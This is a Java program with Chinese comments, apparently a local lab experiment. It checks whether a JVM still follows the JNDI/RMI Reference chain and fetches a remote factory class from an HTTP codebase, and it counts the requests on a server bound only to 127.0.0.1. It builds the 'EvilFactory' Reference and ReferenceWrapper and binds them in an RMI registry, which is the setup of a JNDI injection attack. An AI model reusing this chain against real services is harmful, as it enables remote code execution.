import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.net.InetSocketAddress;
import java.nio.file.Files;
import java.nio.file.Path;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Hashtable;
import java.util.List;
import java.util.concurrent.atomic.AtomicInteger;
import javax.naming.InitialContext;
import javax.naming.Reference;
import javax.naming.spi.NamingManager;

/**
 * 实验 4：把 JNDI 那条链**真的走到 Reference 解码那一步**（11 篇里只到「拿回代理」就停了）。
 *
 * 做法要点：要走进解码，绑到 RMI 上的对象必须是 JNDI provider 认得的
 * `com.sun.jndi.rmi.registry.ReferenceWrapper` —— 它是 JDK 内部类，
 * 装在**未导出**的包里，所以本次要跑两种模式：
 *   A) 不带 --add-exports：看它到底报什么（模块封装在这里起的作用就是可测的了）
 *   B) 带 --add-exports java.naming/com.sun.jndi.rmi.registry=ALL-UNNAMED：能不能走到解码
 *
 * 本地起一个只绑 127.0.0.1 的 HTTP 服务当 codebase，只统计请求；被取走的工厂类是我们自己写的
 * 无害类（构造函数只打印一行），**不含任何落地动作**。真实世界里落地动作就在那个位置。
 */
public class SecJndi2 {

    static final AtomicInteger HITS = new AtomicInteger();
    static final List<String> PATHS = Collections.synchronizedList(new ArrayList<>());

    public static void main(String[] args) throws Exception {
        System.out.println("    [模式] --add-exports 生效吗（能构造内部 ReferenceWrapper 吗）？见下面第 2 步");

        System.out.println("    === 1) 本地 codebase 服务与信任开关 ===");
        Path cbDir = Path.of(System.getProperty("codebase.dir", "."));
        HttpServer http = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
        http.createContext("/", ex -> handle(ex, cbDir));
        http.setExecutor(null);
        http.start();
        int httpPort = http.getAddress().getPort();
        String codebase = "http://127.0.0.1:" + httpPort + "/";
        System.out.println("        codebase = " + codebase + "（只绑 127.0.0.1，只统计请求）");
        System.out.println("        目录里有：" + Files.list(cbDir).map(p -> p.getFileName().toString())
                .reduce((a, b) -> a + ", " + b).orElse("(空)"));
        for (String k : new String[] { "com.sun.jndi.rmi.object.trustURLCodebase",
                "com.sun.jndi.ldap.object.trustURLCodebase" }) {
            System.out.println("        " + k + " = " + (System.getProperty(k) == null
                    ? "(未设置 → 用 JVM 内置默认)" : System.getProperty(k)));
        }

        System.out.println();
        System.out.println("    === 2) 关键一步：那条经典链的「构造工具」是 JDK 内部类 ===");
        Reference ref = new Reference("EvilObject", "EvilFactory", codebase);
        System.out.println("        Reference: className=" + ref.getClassName()
                + "，factory=" + ref.getFactoryClassName() + "，factoryLocation=" + ref.getFactoryClassLocation());
        Object wrapper = null;
        try {
            Class<?> rw = Class.forName("com.sun.jndi.rmi.registry.ReferenceWrapper");
            Constructor<?> c = rw.getConstructor(Reference.class);
            wrapper = c.newInstance(ref);
            System.out.println("        构造成功：" + wrapper.getClass().getName()
                    + "（说明本次 --add-exports 生效）");
        } catch (Throwable t) {
            System.out.println("        构造失败：" + t.getClass().getName() + ": " + t.getMessage());
            System.out.println("        （模块封装把这条老路的构造工具关在未导出的包里；"
                    + "要复现必须显式 --add-exports，这本身就是一条读数）");
        }

        System.out.println();
        System.out.println("    === 3) 走通用路径（NamingManager）做对照 ===");
        try {
            Object o = NamingManager.getObjectInstance(ref, null, null, new Hashtable<>());
            System.out.println("        返回：" + o.getClass().getName()
                    + "（就是那个 Reference 本身吗？" + (o instanceof Reference) + "）");
        } catch (Throwable t) {
            System.out.println("        抛：" + t.getClass().getName() + ": " + t.getMessage());
        }
        System.out.println("        此时 HTTP 收到的请求数 = " + HITS.get() + " " + PATHS);

        System.out.println();
        System.out.println("    === 4) 绑到 RMI registry 上再 lookup（真正的解码路径）===");
        if (wrapper == null) {
            System.out.println("        跳过：第 2 步没能构造出内部包装类");
        } else {
            int rmiPort = 2200 + (int) (Math.random() * 400);
            Registry registry = LocateRegistry.createRegistry(rmiPort);
            registry.rebind("evil", (Remote) wrapper);
            System.out.println("        已绑到 rmi://127.0.0.1:" + rmiPort + "/evil");
            try {
                Object o = new InitialContext().lookup("rmi://127.0.0.1:" + rmiPort + "/evil");
                System.out.println("        lookup 返回：" + o.getClass().getName() + " → " + o);
                if (o instanceof Reference r2) {
                    System.out.println("        返回的是 Reference（说明走了解码）！factoryLocation="
                            + r2.getFactoryClassLocation());
                }
            } catch (Throwable t) {
                System.out.println("        lookup 抛：" + t.getClass().getName() + ": " + firstLine(t.getMessage()));
            }
            System.out.println("        此时 HTTP 收到的请求数 = " + HITS.get() + " " + PATHS);
            try { UnicastRemoteObject.unexportObject(registry, true); } catch (Exception ignored) { }
        }

        System.out.println();
        System.out.println("    === 5) 结论读数 ===");
        System.out.println("        HTTP 总请求数 = " + HITS.get() + "，路径 = " + PATHS);
        System.out.println(HITS.get() == 0
                ? "        → 本机这一次：JVM 没有去远端取工厂类（0 次请求）"
                : "        → 本机这一次：JVM 确实去远端取了（见上面路径）");
        http.stop(0);
        // RMI / HTTP 线程是非守护线程，不显式退出程序不结束
        System.exit(0);
    }

    static void handle(HttpExchange ex, Path cbDir) {
        String p = ex.getRequestURI().getPath();
        HITS.incrementAndGet();
        PATHS.add(p + "(UA=" + ex.getRequestHeaders().getFirst("User-Agent") + ")");
        System.out.println("        >> [HTTP] 收到请求：" + p);
        try {
            String name = p.startsWith("/") ? p.substring(1) : p;
            Path f = cbDir.resolve(name).normalize();
            if (f.startsWith(cbDir) && Files.isRegularFile(f)) {
                byte[] body = Files.readAllBytes(f);
                ex.getResponseHeaders().add("Content-Type", "application/java-vm");
                ex.sendResponseHeaders(200, body.length);
                try (OutputStream os = ex.getResponseBody()) { os.write(body); }
                System.out.println("        >> [HTTP] 返回 " + body.length + " 字节（" + name + "）");
            } else {
                ex.sendResponseHeaders(404, -1);
                System.out.println("        >> [HTTP] 404（目录里没有 " + name + "）");
            }
        } catch (Exception e) {
            System.out.println("        >> [HTTP] 出错：" + e);
        } finally {
            ex.close();
        }
    }

    static String firstLine(String s) {
        if (s == null) return "(无消息)";
        int i = s.indexOf('\n');
        return i < 0 ? s : s.substring(0, i);
    }
}
